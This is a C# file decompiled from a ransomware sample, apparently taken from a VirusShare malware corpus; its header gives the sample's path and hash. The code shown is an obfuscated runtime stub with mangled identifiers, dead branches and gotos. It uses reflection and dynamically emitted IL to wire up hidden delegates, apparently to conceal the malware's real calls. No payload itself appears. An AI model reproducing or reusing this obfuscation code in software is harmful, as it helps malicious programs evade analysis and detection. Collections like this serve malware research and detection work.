// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u000E;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0004
{
  [\u0002]
  [\u0001.\u0001]
  internal static class \u0002
  {
    [\u0002]
    [\u0001.\u0001]
    public static void \u0001([In] Type obj0)
    {
      Type[] typeArray1;
      DynamicMethod dynamicMethod1;
      ILGenerator ilGenerator1;
      MethodInfo[] methods;
      int index1;
      MethodInfo meth;
      FieldInfo fieldInfo1;
      int index2;
      FieldInfo[] fields;
      try
      {
        do
        {
          fields = obj0.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
          for (index2 = 0; index2 < fields.Length; ++index2)
          {
            fieldInfo1 = fields[index2];
            try
            {
              if ((object) fieldInfo1.FieldType == (object) typeof (\u000F.\u0001))
              {
                string empty = string.Empty;
                Type returnType = typeof (string);
                typeArray1 = new Type[1]{ typeof (int) };
                Type[] parameterTypes = typeArray1;
                Type owner = obj0;
                dynamicMethod1 = new DynamicMethod(empty, returnType, parameterTypes, owner, true);
                ilGenerator1 = dynamicMethod1.GetILGenerator();
                ilGenerator1.Emit(OpCodes.Ldarg_0);
                methods = typeof (\u0002).GetMethods(BindingFlags.Static | BindingFlags.Public);
                if (true)
                {
                  index1 = 0;
                  goto label_9;
                }
label_5:
                int num1;
                if ((object) meth.ReturnType == (object) typeof (string))
                {
                  ilGenerator1.Emit(OpCodes.Ldc_I4, fieldInfo1.MetadataToken & 16777215);
                  ilGenerator1.Emit(OpCodes.Sub);
                  ilGenerator1.Emit(OpCodes.Call, meth);
                  if (false)
                    goto label_9;
                  else
                    goto label_11;
                }
                else
                  num1 = index1;
label_8:
                index1 = num1 + 1;
label_9:
                int num2 = index1;
                if (false)
                {
                  num1 = num2;
                  goto label_8;
                }
                else
                {
                  int length = methods.Length;
                  if (num2 < length)
                  {
                    meth = methods[index1];
                    goto label_5;
                  }
                }
label_11:
                ilGenerator1.Emit(OpCodes.Ret);
                fieldInfo1.SetValue((object) null, (object) dynamicMethod1.CreateDelegate(typeof (\u000F.\u0001)));
                break;
              }
            }
            catch
            {
            }
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        FieldInfo fieldInfo2 = fieldInfo1;
        DynamicMethod dynamicMethod2 = dynamicMethod1;
        ILGenerator ilGenerator2 = ilGenerator1;
        MethodInfo methodInfo = meth;
        FieldInfo[] fieldInfoArray = fields;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index2;
        Type[] typeArray2 = typeArray1;
        MethodInfo[] methodInfoArray = methods;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) index1;
        Type type = obj0;
        \u0003.\u0001(ex, (object) fieldInfo2, (object) dynamicMethod2, (object) ilGenerator2, (object) methodInfo, (object) fieldInfoArray, (object) local1, (object) typeArray2, (object) methodInfoArray, (object) local2, (object) type);
        throw;
      }
    }
  }
}
